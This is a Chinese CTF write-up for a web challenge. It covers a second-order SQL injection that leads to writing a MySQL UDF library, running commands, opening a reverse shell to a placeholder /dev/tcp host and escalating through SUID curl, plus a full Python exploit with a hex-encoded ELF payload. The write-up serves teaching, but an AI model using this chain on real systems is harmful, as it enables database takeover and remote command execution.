  <span class="token variable">$studentid</span> <span class="token operator">=</span> <span class="token function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">//            var_dump($studentid);</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"something err0r！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">// 首先去users表查studentid对应的username</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from users where studentid='<span class="token interpolation"><span class="token variable">$studentid</span></span>';"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token comment">// 拿查到的username去查对应成绩</span>
      <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from score where username='<span class="token interpolation"><span class="token variable">$username</span></span>';"</span><span class="token punctuation">;</span>
      <span class="token operator">...</span>
      <span class="token operator">...</span></code></pre>

<p>很明显在上面👆这段中也是非常经典的二次注入。由于score表中存的是<code>username</code>和成绩的映射，而这里是输入学号查询，查询语句没有做join，而是先查users表拿到<code>username</code>再查score，我们的<code>username</code>可是经过转义存入表中的，拿出来未做转义直接插入了另一句sql语句中，从而造成了二次注入。</p>
<p>还有一个小细节，在建表的时候可以看见<code>username</code>是mediumtext而不是varchar，也可以猜到这里有问题了</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span><span class="token punctuation">;</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span> <span class="token punctuation">(</span>
  <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>
  <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token keyword">mediumtext</span><span class="token punctuation">,</span>
  <span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
  <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token keyword">UNIQUE</span> <span class="token keyword">KEY</span> <span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span> <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">11</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span></code></pre>

<h4 id="剩下的网页-amp-接下来的思路"><a href="#剩下的网页-amp-接下来的思路" class="headerlink" title="剩下的网页 &amp; 接下来的思路"></a>剩下的网页 &amp; 接下来的思路</h4><h5 id="config"><a href="#config" class="headerlink" title="config"></a>config</h5><p>存了数据库连接信息和俩函数，一个是转义的一个是检查q合法性的</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'addslashes_deep'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">checkQ</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h5 id="logout"><a href="#logout" class="headerlink" title="logout"></a>logout</h5><p>退出登录</p>
<h5 id="rank"><a href="#rank" class="headerlink" title="rank"></a>rank</h5><p>查看排行，语句写死的，没有操作空间</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from score order by score desc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<h5 id="接下来的思路"><a href="#接下来的思路" class="headerlink" title="接下来的思路"></a>接下来的思路</h5><p>相信做到这一步的师傅们肯定数据库也看过了，当然毕竟是新生赛，网页全部源码数据库文件和配置文件全部都给大家了，考验的就是看大家的细心程度</p>
<p>init.sql文件可以看到在ctf表中有这样一条记录</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">BEGIN</span><span class="token punctuation">;</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>ctf<span class="token punctuation">`</span></span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">,</span> <span class="token string">'flag_in_/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">COMMIT</span><span class="token punctuation">;</span></code></pre>

<p>flag在根目录？那不就是要load_file读文件吗。那再看一下权限</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">GRANT</span> <span class="token keyword">file</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span></code></pre>

<p>可以文件落地，也有insert权限</p>
<p>再看一下目录</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">secure<span class="token operator">-</span><span class="token keyword">file</span><span class="token operator">-</span>priv<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>mysql<span class="token operator">/</span>plugin</code></pre>

<p>虽然不为空，但看到plugin应该很敏感，在插件目录下，可以文件落地，要读文件，很明显那就是用udf或者mof了</p>
<p>这里提一句，如果没限制目录但flag去了权限，那有师傅就会想去在web目录下落地个webshell，但这里部署是站库分离的，后面也会讲这一点，mysql服务器在内网可出网，没有web服务，问题来了，如果不可出网该怎么利用呢？这里留一个思考的问题。</p>
<h4 id="落地-so文件"><a href="#落地-so文件" class="headerlink" title="落地.so文件"></a>落地.so文件</h4><p>由于服务器是linux的，我们就要写.so文件在plugin目录下，如果是windows就要写.dll文件</p>
<p>sqlmap其实自带提权脚本，但没法直接利用，把它的.so文件导出后hex取其值接下来会用到</p>
<p>已经有admin了所以操作会简单很多，语句为</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> score <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'$username'</span><span class="token punctuation">;</span></code></pre>

<p>那我们注册一个学号为1，用户名为<code>a&#39;;select 123#</code>的用户，然后去查对应的学号就行了</p>
<p>我们把.so文件写入到plugin目录下</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 写.so文件</span>
a<span class="token string">';select &lt;0x7F...刚才获取的hex值> into dumpfile '</span><span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>mysql<span class="token operator">/</span>plugin<span class="token operator">/</span>exp<span class="token punctuation">.</span>so'<span class="token punctuation">;</span><span class="token comment">#</span></code></pre>

<h4 id="创建udf-amp-命令执行"><a href="#创建udf-amp-命令执行" class="headerlink" title="创建udf &amp; 命令执行"></a>创建udf &amp; 命令执行</h4><p>两句话完成，还是利用score页面的二次注入</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 创建udf，这里默认会从plugin目录下找.so文件，创建一个用户自定义函数sys_eval</span>
<span class="token string">';CREATE FUNCTION sys_eval RETURNS STRING SONAME '</span>exp<span class="token punctuation">.</span>so<span class="token string">';#
# 执行命令
'</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre>

<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>执行<code>echo &#39;/bin/bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&#39;|sh</code></p>
<img src="/article/eruditeFlower/image-20221007121541949.png" class="" title="image-20221007121541949" loading="lazy">

<h4 id="小提权"><a href="#小提权" class="headerlink" title="小提权"></a>小提权</h4><p>直接<code>cat /flag</code>没有权限，有个小提权在这里，不是很复杂，查找有suid的程序<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，可以看到curl有suid权限，且我们有curl的执行权限，因此执行<code>curl file:///flag</code>即可获得flag</p>
<img src="/article/eruditeFlower/image-20221007122036015.png" class="" title="image-20221007122036015" loading="lazy">

<p>当然，也可以在页面上一句句执行，只不过有些复杂，但总归不可能直接就知道curl有suid权限，不可能直接curl读flag的，毕竟还是有个小考点一个小流程在这的</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
-*- coding: utf-8 -*-
@File: exp.py
@Author: Err0r
@Time: 3月 13, 2021
"""</span>
<span class="token keyword">import</span> random
<span class="token keyword">import</span> string

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:20712"</span>

CMD <span class="token operator">=</span> <span class="token string">"echo '/bin/bash -i >&amp; /dev/tcp/[ip]/[port] 0>&amp;1'|sh"</span>

session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
COOKIES <span class="token operator">=</span> <span class="token punctuation">&#123;</span>

<span class="token punctuation">&#125;</span>
HEADERS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"</span><span class="token punctuation">,</span>
    <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'get'</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># print(url)</span>
    data <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span>
    params <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"params"</span><span class="token punctuation">)</span>
    cookies<span class="token punctuation">.</span>update<span class="token punctuation">(</span>COOKIES<span class="token punctuation">)</span>
    headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span>HEADERS<span class="token punctuation">)</span>
    <span class="token keyword">if</span> method <span class="token operator">==</span> <span class="token string">'get'</span><span class="token punctuation">:</span>
        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
            url<span class="token operator">=</span>url<span class="token punctuation">,</span>
            data<span class="token operator">=</span>data<span class="token punctuation">,</span>
            params<span class="token operator">=</span>params<span class="token punctuation">,</span>
            headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>
            cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>
            timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span>
            allow_redirects<span class="token operator">=</span>allow_redirects
        <span class="token punctuation">)</span>
    <span class="token keyword">elif</span> method <span class="token operator">==</span> <span class="token string">'post'</span><span class="token punctuation">:</span>
        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
            url<span class="token operator">=</span>url<span class="token punctuation">,</span>
            data<span class="token operator">=</span>data<span class="token punctuation">,</span>
            params<span class="token operator">=</span>params<span class="token punctuation">,</span>
            headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>
            cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>
            timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span>
            allow_redirects<span class="token operator">=</span>allow_redirects
        <span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        session<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># close session</span>
        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Requests method error.'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> resp<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">getRadmonStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">reg</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">:</span>
    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/register.php"</span>
    studentid <span class="token operator">=</span> getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span>
    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"username"</span><span class="token punctuation">:</span> sql<span class="token punctuation">,</span>
        <span class="token string">"studentid"</span><span class="token punctuation">:</span> studentid<span class="token punctuation">,</span>
        <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"提交"</span>
    <span class="token punctuation">&#125;</span>
    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> studentid


<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> studentid<span class="token punctuation">)</span><span class="token punctuation">:</span>
    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/login.php"</span>
    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
        <span class="token string">"studentid"</span><span class="token punctuation">:</span> studentid<span class="token punctuation">,</span>
        <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"提交"</span>
    <span class="token punctuation">&#125;</span>
    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>
    <span class="token comment"># print(res)</span>
    <span class="token keyword">return</span> res


<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/logout.php"</span>
    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">postAns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/index.php"</span>
    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"q1"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
        <span class="token string">"q2"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
        <span class="token string">"q3"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span>
        <span class="token comment"># "q6": "5"</span>
        <span class="token string">"q4"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
        <span class="token string">"q5"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>
    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>
    <span class="token comment"># print(res)</span>


<span class="token keyword">def</span> <span class="token function">posScore</span><span class="token punctuation">(</span>studentid<span class="token punctuation">)</span><span class="token punctuation">:</span>
    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/score.php"</span>
    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"studentid"</span><span class="token punctuation">:</span> studentid<span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>
    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>
    <span class="token comment"># print(res)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    passwd <span class="token operator">=</span> getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span>
    poc <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token comment"># 这里可以利用特性直接select获取到admin密码，或者像这样直接修改admin密码</span>
        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">');update users set studentid='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>passwd<span class="token punctuation">&#125;</span></span><span class="token string">' where username='admin';\x23"</span></span><span class="token punctuation">,</span>
        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">';select 0x7F454C4602010100000000000000000003003E0001000000D00C0000000000004000000000000000E8180000000000000000000040003800050040001A00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050E57464040000006412000000000000641200000000000064120000000000009C000000000000009C00000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002B0000001500000005000000280000001E000000000000000000000006000000000000000C00000000000000070000002A00000009000000210000000000000000000000270000000B0000002200000018000000240000000E00000000000000040000001D0000001600000000000000130000000000000000000000120000002300000010000000250000001A0000000F000000000000000000000000000000000000001B00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000A00000011000000000000000000000000000000000000000D0000002600000017000000000000000800000000000000000000000000000000000000000000001F0000001C0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119C4C93DA4400398046883140000001600000017000000190000001B0000001D0000002000000022000000000000002300000000000000240000002500000027000000290000002A00000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED871581CC1E2F7DEA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF36AC68AE3B9FD4A0AC73D1C525681B320B5911FEAB5FBE120000000000000000000000000000000000000000000000000000000003000900A00B0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000E0000000120000000000000000000000DE01000000000000790100001200000000000000000000007700000000000000BA0000001200000000000000000000003504000000000000F5000000120000000000000000000000C2010000000000009E010000120000000000000000000000D900000000000000FB000000120000000000000000000000050000000000000016000000220000000000000000000000FE00000000000000CF000000120000000000000000000000AD00000000000000880100001200000000000000000000008000000000000000AB010000120000000000000000000000250100000000000010010000120000000000000000000000DC00000000000000C7000000120000000000000000000000C200000000000000B5000000120000000000000000000000CC02000000000000ED000000120000000000000000000000E802000000000000E70000001200000000000000000000009B00000000000000C200000012000000000000000000000028000000000000008001000012000B007A100000000000006E000000000000007500000012000B00A70D00000000000001000000000000001000000012000C00781100000000000000000000000000003F01000012000B001A100000000000002D000000000000001F01000012000900A00B0000000000000000000000000000C30100001000F1FF881720000000000000000000000000009600000012000B00AB0D00000000000001000000000000007001000012000B0066100000000000001400000000000000CF0100001000F1FF981720000000000000000000000000005600000012000B00A50D00000000000001000000000000000201000012000B002E0F0000000000002900000000000000A301000012000B00F71000000000000041000000000000003900000012000B00A40D00000000000001000000000000003201000012000B00EA0F0000000000003000000000000000BC0100001000F1FF881720000000000000000000000000006500000012000B00A60D00000000000001000000000000002501000012000B00800F0000000000006A000000000000008500000012000B00A80D00000000000003000000000000001701000012000B00570F00000000000029000000000000005501000012000B0047100000000000001F00000000000000A900000012000B00AC0D0000000000009A000000000000008F01000012000B00E8100000000000000F00000000000000D700000012000B00460E000000000000E800000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F6765745F6465696E6974007379735F657865635F6465696E6974007379735F6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C00666F726B00737973636F6E66006D6D6170007374726E6370790077616974706964007379735F6576616C006D616C6C6F6300706F70656E007265616C6C6F630066676574730070636C6F7365007379735F6576616C5F696E697400737472637079007379735F657865635F696E6974007379735F7365745F696E6974007379735F6765745F696E6974006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F657865630073797374656D007379735F73657400736574656E76007379735F7365745F6465696E69740066726565007379735F67657400676574656E76006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100B20100001000000000000000751A690900000200D401000000000000801720000000000008000000000000008017200000000000D01620000000000006000000020000000000000000000000D81620000000000006000000030000000000000000000000E016200000000000060000000A00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000A00000000000000000000003817200000000000070000000B00000000000000000000004017200000000000070000000C00000000000000000000004817200000000000070000000D00000000000000000000005017200000000000070000000E00000000000000000000005817200000000000070000000F00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883EC08E827010000E8C2010000E88D0500004883C408C3FF35320B2000FF25340B20000F1F4000FF25320B20006800000000E9E0FFFFFFFF252A0B20006801000000E9D0FFFFFFFF25220B20006802000000E9C0FFFFFFFF251A0B20006803000000E9B0FFFFFFFF25120B20006804000000E9A0FFFFFFFF250A0B20006805000000E990FFFFFFFF25020B20006806000000E980FFFFFFFF25FA0A20006807000000E970FFFFFFFF25F20A20006808000000E960FFFFFFFF25EA0A20006809000000E950FFFFFFFF25E20A2000680A000000E940FFFFFFFF25DA0A2000680B000000E930FFFFFFFF25D20A2000680C000000E920FFFFFFFF25CA0A2000680D000000E910FFFFFFFF25C20A2000680E000000E900FFFFFFFF25BA0A2000680F000000E9F0FEFFFF00000000000000004883EC08488B05F50920004885C07402FFD04883C408C390909090909090909055803D900A2000004889E5415453756248833DD809200000740C488B3D6F0A2000E812FFFFFF488D05130820004C8D2504082000488B15650A20004C29E048C1F803488D58FF4839DA73200F1F440000488D4201488905450A200041FF14C4488B153A0A20004839DA72E5C605260A2000015B415CC9C3660F1F8400000000005548833DBF072000004889E57422488B05530920004885C07416488D3DA70720004989C3C941FFE30F1F840000000000C9C39090C3C3C3C331C0C3C341544883C9FF4989F455534883EC10488B4610488B3831C0F2AE48F7D1488D69FFE8B6FEFFFF83F80089C77C61754FBF1E000000E803FEFFFF488D70FF4531C94531C031FFB921000000BA07000000488D042E48F7D64821C6E8AEFEFFFF4883F8FF4889C37427498B4424104889EA4889DF488B30E852FEFFFFFFD3EB0CBA0100000031F6E802FEFFFF31C0EB05B8010000005A595B5D415CC34157BF00040000415641554531ED415455534889F34883EC1848894C24104C89442408E85AFDFFFFBF010000004989C6E84DFDFFFFC600004889C5488B4310488D356A030000488B38E814FEFFFF4989C7EB374C89F731C04883C9FFF2AE4889EF48F7D1488D59FF4D8D641D004C89E6E8DDFDFFFF4A8D3C284889DA4C89F64D89E54889C5E8A8FDFFFF4C89FABE080000004C89F7E818FDFFFF4885C075B44C89FFE82BFDFFFF807D0000750A488B4424